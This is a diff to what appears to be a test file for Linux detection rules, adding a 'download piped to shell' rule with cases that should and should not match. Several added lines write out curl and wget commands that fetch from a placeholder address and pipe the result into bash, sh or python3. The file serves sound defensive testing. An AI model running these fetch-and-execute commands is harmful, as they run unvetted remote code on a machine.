@@ -19,6 +19,7 @@ NC = "Netcat or Socat Reverse Shell Execution"
 KMOD = "Kernel Module Load from Suspicious Path"
 CHMOD = "SUID/SGID Bit Added via chmod"
 B64 = "Base64-Decode Piped to Shell"
+DLPIPE = "Linux Download and Execute Piped to Shell"
 SUDOERS = "Sudoers Configuration Tampering"
 SSHD = "SSH Daemon Configuration Tampering"
 KEYS = "SSH authorized_keys Written"
@@ -30,6 +31,7 @@ RULE_FILES = {
     KMOD: "proc_creation_lnx_kmod_load_susp_path.yml",
     CHMOD: "proc_creation_lnx_chmod_suid.yml",
     B64: "proc_creation_lnx_base64_pipe_shell.yml",
+    DLPIPE: "proc_creation_lnx_download_pipe_shell.yml",
     SUDOERS: "file_event_lnx_sudoers_tamper.yml",
     SSHD: "file_event_lnx_sshd_config_tamper.yml",
     KEYS: "file_event_lnx_ssh_authorized_keys.yml",
@@ -86,6 +88,17 @@ PROCESS_CASES = [
     (B64, "/usr/bin/bash", "bash -c 'base64 -d payload.b64 > out.bin'", False),
     (B64, "/usr/bin/bash", "bash -c 'echo hi | base64; ls -d /tmp | sh'", False),
     (B64, "/usr/bin/bash", "bash -c 'base64 -d p | gunzip | tee out; echo done | shasum'", False),
+    # download | interpreter: the pipe target is a whole word, not a prefix.
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | bash'", True),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a|sh'", True),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a | sudo -E bash -s'", True),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | /bin/sh'", True),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | python3 -'", True),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | sha256sum'", False),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | shasum -a 256'", False),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'wget -qO- http://203.0.113.9/a | tar xz'", False),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a | tee a.sh'", False),
+    (DLPIPE, "/usr/bin/bash", "bash -c 'curl -s http://203.0.113.9/a -o a.sh'", False),
 ]
 
 PKG = "/usr/bin/dpkg"
